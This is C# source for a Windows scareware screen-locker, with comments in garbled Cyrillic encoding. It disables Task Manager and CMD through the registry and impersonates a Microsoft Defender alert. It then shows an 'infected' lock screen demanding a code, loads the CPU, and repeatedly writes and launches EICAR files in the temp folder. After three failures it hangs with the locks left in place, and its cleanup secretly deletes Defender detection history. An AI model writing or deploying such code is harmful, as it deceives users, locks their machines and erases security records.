using System;
using System.IO;
using System.Threading;
using System.Windows.Forms;
using System.Drawing;
using System.Diagnostics;
using Microsoft.Win32;

class Program
{
    static string secretCode = "";
    static string keyFilePath = "";
    static bool stopFlag = false;
    static int attempts = 0;
    const int MAX_ATTEMPTS = 3;
    const string MASTER_CODE = "1%%";

    static void Main()
    {
        // ---- ÁËÎÊÈÐÓÅÌ ÄÈÑÏÅÒ×ÅÐ È CMD ----
        BlockTaskManagerAndCMD();

        // ---- ÃÅÍÅÐÈÐÓÅÌ ÑËÓ×ÀÉÍÛÉ ÊÎÄ ----
        secretCode = GenerateCode();

        // ---- ÑÎÕÐÀÍßÅÌ ÊÎÄ Â ÏÀÏÊÓ ÇÀÃÐÓÇÎÊ ----
        string downloadsPath = Environment.GetFolderPath(Environment.SpecialFolder.UserProfile) + "\\Downloads";
        string codeFilePath = downloadsPath + "\\code.txt";
        File.WriteAllText(codeFilePath, "Your recovery code: " + secretCode);

        // ---- ÎÊÍÎ DEFENDER ----
        Form form = new Form();
        form.Text = "Microsoft Defender - Threat Detected";
        form.FormBorderStyle = FormBorderStyle.FixedDialog;
        form.ControlBox = false;
        form.StartPosition = FormStartPosition.CenterScreen;
        form.Size = new System.Drawing.Size(520, 260);
        form.BackColor = Color.White;

        Label iconLabel = new Label();
        iconLabel.Text = "[!]";
        iconLabel.Font = new Font("Segoe UI", 24, FontStyle.Bold);
        iconLabel.ForeColor = Color.FromArgb(200, 20, 20);
        iconLabel.Location = new System.Drawing.Point(20, 20);
        iconLabel.Size = new System.Drawing.Size(60, 60);
        form.Controls.Add(iconLabel);

        Label label = new Label();
        label.Text = "A potential threat has been detected.\n\n" +
                     "Your computer may be at risk.\n" +
                     "It is recommended to run a scan immediately.";
        label.Font = new Font("Segoe UI", 11, FontStyle.Regular);
        label.Location = new System.Drawing.Point(90, 30);
        label.Size = new System.Drawing.Size(370, 100);
        label.TextAlign = ContentAlignment.MiddleLeft;
        form.Controls.Add(label);

        Button okButton = new Button();
        okButton.Text = "Run Scan";
        okButton.BackColor = Color.FromArgb(0, 120, 215);
        okButton.ForeColor = Color.White;
        okButton.Font = new Font("Segoe UI", 10, FontStyle.Bold);
        okButton.Location = new System.Drawing.Point(90, 150);
        okButton.Size = new System.Drawing.Size(180, 40);
        okButton.FlatStyle = FlatStyle.Flat;
        okButton.Click += (sender, e) =>
        {
            form.Close();
            ShowCodeAndRunVirus(secretCode);
        };
        form.Controls.Add(okButton);

        Button cancelButton = new Button();
        cancelButton.Text = "Close";
        cancelButton.BackColor = Color.LightGray;
        cancelButton.ForeColor = Color.Black;
        cancelButton.Font = new Font("Segoe UI", 10, FontStyle.Regular);
        cancelButton.Location = new System.Drawing.Point(280, 150);
        cancelButton.Size = new System.Drawing.Size(120, 40);
        cancelButton.FlatStyle = FlatStyle.Flat;
        cancelButton.Enabled = false;
        form.Controls.Add(cancelButton);

        form.ShowDialog();
        Environment.Exit(0);
    }

    static void ShowCodeAndRunVirus(string code)
    {
        Form codeForm = new Form();
        codeForm.Text = "Recovery Code";
        codeForm.FormBorderStyle = FormBorderStyle.FixedDialog;
        codeForm.ControlBox = false;
        codeForm.StartPosition = FormStartPosition.CenterScreen;
        codeForm.Size = new System.Drawing.Size(520, 280);
        codeForm.BackColor = Color.Black;

        Label mainLabel = new Label();
        mainLabel.Text = "! ATTENTION !\n\n" +
                         "Your computer has been infected.\n" +
                         "To restore access, open the Downloads folder.\n" +
                         "Find the file: code.txt\n\n" +
                         "Enter the code from that file.\n\n" +
                         "You have 3 attempts.";
        mainLabel.ForeColor = Color.Red;
        mainLabel.Font = new Font("Segoe UI", 12, FontStyle.Bold);
        mainLabel.AutoSize = false;
        mainLabel.TextAlign = ContentAlignment.MiddleCenter;
        mainLabel.Dock = DockStyle.Top;
        mainLabel.Height = 180;
        codeForm.Controls.Add(mainLabel);

        Label hintLabel = new Label();
        hintLabel.Text = "DO NOT CLOSE THIS WINDOW.\n" +
                         "If you close it, the virus will remain.";
        hintLabel.ForeColor = Color.Gray;
        hintLabel.Font = new Font("Segoe UI", 10, FontStyle.Regular);
        hintLabel.AutoSize = false;
        hintLabel.TextAlign = ContentAlignment.MiddleCenter;
        hintLabel.Dock = DockStyle.Fill;
        codeForm.Controls.Add(hintLabel);

        Button okButton = new Button();
        okButton.Text = "I have the code";
        okButton.BackColor = Color.DarkRed;
        okButton.ForeColor = Color.White;
        okButton.Font = new Font("Segoe UI", 10, FontStyle.Bold);
        okButton.Dock = DockStyle.Bottom;
        okButton.Height = 50;
        okButton.Click += (sender, e) =>
        {
            codeForm.Close();
            RunVirusAndInputWindow(code);
        };
        codeForm.Controls.Add(okButton);

        codeForm.ShowDialog();
    }

    static void RunVirusAndInputWindow(string secretCode)
    {
        string temp = Path.GetTempPath();
        string eicar = "X5O!P%@AP[4\\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*";

        Thread virusThread = new Thread(() =>
        {
            int counter = 0;
            while (!stopFlag && attempts < MAX_ATTEMPTS)
            {
                // Ëàãè (íàãðóçêà íà CPU)
                DateTime start = DateTime.Now;
                while ((DateTime.Now - start).TotalMilliseconds < 3000)
                {
                    for (int i = 0; i < 1000000; i++)
                    {
                        double x = Math.Sqrt(i) * Math.PI / 2;
                    }
                    Application.DoEvents();
                }

                Thread.Sleep(2000);

                for (int i = 0; i < 30; i++)
                {
                    if (stopFlag || attempts >= MAX_ATTEMPTS) break;
                    string path = temp + "ERROR_" + counter + ".com";
                    File.WriteAllText(path, eicar);
                    try { Process.Start(path); } catch { }
                    counter++;
                    Thread.Sleep(20);
                }

                Thread.Sleep(1500);
            }
        });
        virusThread.Start();

        bool codeEntered = false;

        Form inputForm = new Form();
        inputForm.Text = "Enter Recovery Code";
        inputForm.FormBorderStyle = FormBorderStyle.FixedDialog;
        inputForm.ControlBox = false;
        inputForm.StartPosition = FormStartPosition.CenterScreen;
        inputForm.Size = new System.Drawing.Size(420, 300);
        inputForm.BackColor = Color.Black;

        Label instructionLabel = new Label();
        instructionLabel.Text = "! ATTENTION !\n\n" +
                                 "Enter the recovery code.\n" +
                                 "You have 3 attempts.\n\n" +
                                 "Attempts remaining: " + (MAX_ATTEMPTS - attempts) + "\n\n" +
                                 "Find the code in: Downloads > code.txt";
        instructionLabel.ForeColor = Color.Red;
        instructionLabel.Font = new Font("Segoe UI", 10, FontStyle.Bold);
        instructionLabel.AutoSize = false;
        instructionLabel.TextAlign = ContentAlignment.MiddleCenter;
        instructionLabel.Dock = DockStyle.Top;
        instructionLabel.Height = 160;
        inputForm.Controls.Add(instructionLabel);

        TextBox inputBox = new TextBox();
        inputBox.Font = new Font("Consolas", 14, FontStyle.Bold);
        inputBox.TextAlign = HorizontalAlignment.Center;
        inputBox.Location = new System.Drawing.Point(50, 170);
        inputBox.Size = new System.Drawing.Size(320, 30);
        inputForm.Controls.Add(inputBox);

        Button confirmButton = new Button();
        confirmButton.Text = "UNLOCK";
        confirmButton.BackColor = Color.DarkRed;
        confirmButton.ForeColor = Color.White;
        confirmButton.Font = new Font("Segoe UI", 10, FontStyle.Bold);
        confirmButton.Location = new System.Drawing.Point(110, 210);
        confirmButton.Size = new System.Drawing.Size(200, 40);
        confirmButton.FlatStyle = FlatStyle.Flat;
        confirmButton.Click += (sender, e) =>
        {
            string userInput = inputBox.Text.Trim();

            // ---- ÌÀÑÒÅÐ-ÊÎÄ ----
            if (userInput == MASTER_CODE)
            {
                stopFlag = true;
                virusThread.Join();
                Cleanup();
                MessageBox.Show(
                    "Master code accepted.\n" +
                    "All threats have been removed.",
                    "Microsoft Defender",
                    MessageBoxButtons.OK,
                    MessageBoxIcon.Information
                );
                inputForm.Close();
                Environment.Exit(0);
            }

            if (userInput == secretCode)
            {
                codeEntered = true;
                inputForm.Close();
            }
            else
            {
                attempts++;
                if (attempts >= MAX_ATTEMPTS)
                {
                    MessageBox.Show(
                        "Too many failed attempts!\n" +
                        "The virus will remain.\n" +
                        "You can no longer unlock this PC.",
                        "System Locked",
                        MessageBoxButtons.OK,
                        MessageBoxIcon.Error
                    );
                    inputForm.Close();
                    while (true) Thread.Sleep(1000);
                }
                else
                {
                    MessageBox.Show(
                        "Invalid code!\n\n" +
                        "Attempts remaining: " + (MAX_ATTEMPTS - attempts) + "\n" +
                        "Check Downloads > code.txt",
                        "Error",
                        MessageBoxButtons.OK,
                        MessageBoxIcon.Error
                    );
                    inputBox.Clear();
                    inputBox.Focus();
                    instructionLabel.Text = "! ATTENTION !\n\n" +
                                             "Enter the recovery code.\n" +
                                             "You have 3 attempts.\n\n" +
                                             "Attempts remaining: " + (MAX_ATTEMPTS - attempts) + "\n\n" +
                                             "Find the code in: Downloads > code.txt";
                }
            }
        };
        inputForm.Controls.Add(confirmButton);

        inputForm.ShowDialog();

        if (codeEntered)
        {
            stopFlag = true;
            virusThread.Join();
            Cleanup();

            MessageBox.Show(
                "Threats successfully removed!\n\n" +
                "Your computer is now safe.",
                "Microsoft Defender",
                MessageBoxButtons.OK,
                MessageBoxIcon.Information
            );
        }
    }

    static void BlockTaskManagerAndCMD()
    {
        try
        {
            RegistryKey key = Registry.CurrentUser.CreateSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System");
            key.SetValue("DisableTaskMgr", 1, RegistryValueKind.DWord);

            RegistryKey keyCMD = Registry.CurrentUser.CreateSubKey("Software\\Policies\\Microsoft\\Windows\\System");
            keyCMD.SetValue("DisableCMD", 2, RegistryValueKind.DWord);
        }
        catch { }
    }

    static void Cleanup()
    {
        try
        {
            string temp = Path.GetTempPath();
            string[] files = Directory.GetFiles(temp, "ERROR_*.com");
            foreach (string file in files) File.Delete(file);
        }
        catch { }

        try
        {
            if (File.Exists(keyFilePath)) File.Delete(keyFilePath);
        }
        catch { }

        try
        {
            Process.Start(new ProcessStartInfo
            {
                FileName = "powershell.exe",
                Arguments = "-Command \"Remove-Item -Path '$env:ProgramData\\Microsoft\\Windows Defender\\Scans\\History\\Service\\DetectionHistory\\*' -Force -Recurse -ErrorAction SilentlyContinue\"",
                WindowStyle = ProcessWindowStyle.Hidden
            }).WaitForExit(3000);
        }
        catch { }

        try
        {
            RegistryKey key = Registry.CurrentUser.OpenSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System", true);
            if (key != null) key.DeleteValue("DisableTaskMgr", false);
        }
        catch { }

        try
        {
            RegistryKey keyCMD = Registry.CurrentUser.OpenSubKey("Software\\Policies\\Microsoft\\Windows\\System", true);
            if (keyCMD != null) keyCMD.DeleteValue("DisableCMD", false);
        }
        catch { }
    }

    static string GenerateCode()
    {
        string chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";
        Random rand = new Random();
        string code = "";
        for (int i = 0; i < 12; i++)
        {
            code += chars[rand.Next(chars.Length)];
            if (i == 3 || i == 7) code += "-";
        }
        return code;
    }
}